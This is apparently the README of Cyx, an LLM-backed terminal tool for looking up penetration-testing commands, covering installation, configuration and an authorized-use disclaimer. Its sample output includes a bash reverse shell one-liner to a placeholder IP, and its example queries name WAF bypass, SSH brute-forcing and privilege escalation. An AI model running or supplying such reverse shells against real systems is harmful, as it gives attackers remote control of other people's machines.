# Cyx

LLM-powered terminal tool for security command lookup. Supports Perplexity, Groq, and Ollama.

## Features

- Command-first output with code blocks
- Learn mode for detailed explanations
- Smart cache with ONNX semantic search
- Local LLM support via Ollama
- Source attribution and links

## Quick Start

```bash
# Clone and build
git clone https://github.com/neur0map/cyx.git
cd cyx
cargo build --release

# Setup (first time - interactive wizard)
./target/release/cyx setup

# Use
cyx "nmap stealth scan"
cyx "sql injection bypass waf"
cyx --learn "linux privilege escalation"
```

## Installation

### Option 1: Download Pre-built Binary (Recommended)

Download the latest release for your platform from the [Releases page](https://github.com/neur0map/cyx/releases).

**Important**: The archive contains both the `cyx` binary and the required ONNX Runtime library. Both files must be kept together.

#### Linux/macOS Installation

**System-wide (recommended):**
```bash
# Extract the archive
tar -xzf cyx-v0.2.0-linux-x86_64.tar.gz
cd cyx-v0.2.0-linux-x86_64

# Install to system
sudo cp cyx /usr/local/bin/
sudo cp libonnxruntime* /usr/local/lib/
sudo ldconfig  # Linux only

# Run setup
cyx setup
```

**Local installation:**
```bash
# Extract and copy to local bin
tar -xzf cyx-v0.2.0-linux-x86_64.tar.gz
cd cyx-v0.2.0-linux-x86_64
mkdir -p ~/.local/bin
cp cyx ~/.local/bin/
cp libonnxruntime* ~/.local/bin/

# Add to PATH (if not already there)
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc

# Run setup
cyx setup
```

### Option 2: Build from Source

#### Prerequisites

- Rust 1.70 or higher
- API key from [Perplexity](https://www.perplexity.ai/settings/api) or [Groq](https://console.groq.com)

#### Build Instructions

```bash
git clone https://github.com/neur0map/cyx.git
cd cyx
cargo build --release
```

**Important for `cargo install` users:**

If you use `cargo install --path .`, you must **manually copy the ONNX Runtime library** to the same directory as the installed binary:

```bash
# Install the binary
cargo install --path .

# Find where cargo installed it (usually ~/.cargo/bin)
INSTALL_DIR=$(dirname $(which cyx))

# Copy the library from the build
cp target/release/libonnxruntime* $INSTALL_DIR/
```

**Recommended:** Use the Makefile which handles this automatically:

```bash
make build    # Build and create symlink for development
make check    # Run fmt + clippy
make install  # Install to system PATH (includes library)
make setup    # Run setup wizard
make help     # Show all commands
```

### Initial Configuration

Run the interactive setup wizard:

```bash
cyx setup
```

This creates `~/.config/cyx/config.toml` with your API key (stored with 600 permissions).

## Usage

### One-Shot Queries

```bash
# Quick command lookup
cyx "reverse shell one liner"
cyx "hydra ssh brute force"

# Learn mode with detailed explanations
cyx --learn "metasploit meterpreter"
cyx -l "nmap service detection"
```


### CLI Options

```
-l, --learn          Educational mode with detailed breakdowns
-q, --quiet          Minimal output (response only, no formatting)
-v, --verbose        Detailed progress information
    --no-tty         Disable TTY features for scripting
```

### Configuration

```bash
cyx config show                           # View current config
cyx config set provider perplexity        # Change provider
cyx setup                                 # Re-run setup wizard
```

Config file: `~/.config/cyx/config.toml`

## Output Examples

### Normal Mode

```
╭─── RESPONSE ──────────────────────────────────────────────
│ ```bash
│ nmap -sS <target>
│ ```
│ TCP SYN stealth scan - doesn't complete handshake. Requires root.
╰──────────────────────────────────────────────────────────

[*] SOURCES
───────────────────────────────────────
Provider: Perplexity (sonar-pro)
Search: Yes (performed web search)

Links:
  - nmap documentation: https://nmap.org/book/synscan.html
  - TCP protocol (RFC 793): https://www.ietf.org/rfc/rfc793.txt
```

### Learn Mode

```bash
cyx --learn "nmap stealth scan"
```

Provides detailed explanations with flag breakdowns, protocol details, and alternatives.

### Quiet Mode

```bash
$ cyx -q "reverse shell bash"
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Troubleshooting

### Error: libonnxruntime.so.1.16.0: cannot open shared object file

This error means the ONNX Runtime library is not in the library search path. This happens when:

1. You downloaded just the binary without the library
2. The library is not in the same directory as the binary
3. The library is not in a system library directory

**Solutions:**

1. **Download the full release package** from the [Releases page](https://github.com/neur0map/cyx/releases) (not just the binary)

2. **Keep the library with the binary**: Extract the full archive and ensure both files are together:
   ```bash
   # Both files should be in the same directory
   ls -l
   # Should show both:
   # cyx
   # libonnxruntime.so.1.16.0 (or .dylib on macOS)
   ```

3. **Install the library system-wide**:
   ```bash
   # Copy from the extracted archive
   sudo cp libonnxruntime* /usr/local/lib/
   sudo ldconfig  # Linux only
   ```

For more detailed troubleshooting, see [BUILDING.md](BUILDING.md).

## Technical Details

### Security

- API keys stored with 600 permissions in `~/.config/cyx/config.toml`
- Read-only operation - provides commands but never executes them
- Timeout protection - all API calls timeout after 120 seconds
- Local-first - all sensitive data remains on your machine

### System Prompts

Normal mode prioritizes executable commands with brief explanations. Learn mode provides detailed educational content with examples and alternatives.

## Disclaimer

**For authorized security testing, educational purposes, and defensive research only.**

This tool is designed for:
- Professional penetration testers with written authorization
- Security students in controlled lab environments
- Capture The Flag (CTF) competitions
- Defensive security and threat analysis

Always obtain explicit permission before testing systems you don't own.

## License

MIT License - See [LICENSE](LICENSE) for details.
